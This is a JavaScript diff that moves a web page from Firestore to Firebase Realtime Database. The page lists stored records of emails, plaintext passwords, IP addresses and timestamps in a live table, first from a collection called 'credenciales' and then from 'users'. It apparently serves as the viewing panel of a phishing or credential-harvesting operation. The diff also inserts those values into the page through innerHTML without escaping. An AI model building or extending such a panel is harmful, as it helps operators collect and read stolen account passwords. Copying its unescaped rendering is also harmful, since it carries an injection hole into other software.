@@ -1,44 +1,41 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js";
-import { getFirestore, collection, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-firestore.js";
+import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js";
 
 const firebaseConfig = {
     apiKey: "AIzaSyBfvn5njW-YQt9NPKd49x8rCVEFKY4dhmw",
     authDomain: "zphdozer.firebaseapp.com",
     projectId: "zphdozer",
+    databaseURL: "https://zphdozer-default-rtdb.firebaseio.com",
     storageBucket: "zphdozer.firebasestorage.app",
     messagingSenderId: "1067331325075",
     appId: "1:1067331325075:web:02794fba9fb9633a171166",
     measurementId: "G-X9CN92LFTF"
 };
 
-// Inicializar Firebase
+// Initialize Firebase
 const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+const database = getDatabase(app);
 
-document.addEventListener('DOMContentLoaded', () => {
-    // Obtener referencia a la tabla
-    const userTableBody = document.getElementById('user-table-body');
+// Reference to the users data
+const usersRef = ref(database, 'users');
 
-    // Crear consulta ordenada por fecha
-    const q = query(collection(db, 'credenciales'), orderBy('timestamp', 'desc'));
+// Listen for changes in the users data
+onValue(usersRef, (snapshot) => {
+    const tableBody = document.getElementById('user-table-body');
+    tableBody.innerHTML = ''; // Clear existing content
 
-    // Escuchar cambios en tiempo real
-    onSnapshot(q, (snapshot) => {
-        userTableBody.innerHTML = ''; // Limpiar tabla
+    snapshot.forEach((childSnapshot) => {
+        const userData = childSnapshot.val();
+        const row = document.createElement('tr');
         
-        snapshot.forEach((doc) => {
-            const data = doc.data();
-            const row = document.createElement('tr');
-            
-            // Crear celdas con los datos
-            row.innerHTML = `
-                <td>${data.email}</td>
-                <td>${data.password}</td>
-                <td>${data.ip || 'No disponible'}</td>
-                <td>${data.timestamp.toDate().toLocaleString()}</td>
-            `;
-            
-            userTableBody.appendChild(row);
-        });
+        // Create table cells
+        row.innerHTML = `
+            <td>${userData.email}</td>
+            <td>${userData.password}</td>
+            <td>${userData.ip}</td>
+            <td>${new Date(userData.timestamp).toLocaleString()}</td>
+        `;
+        
+        tableBody.appendChild(row);
     });
 });
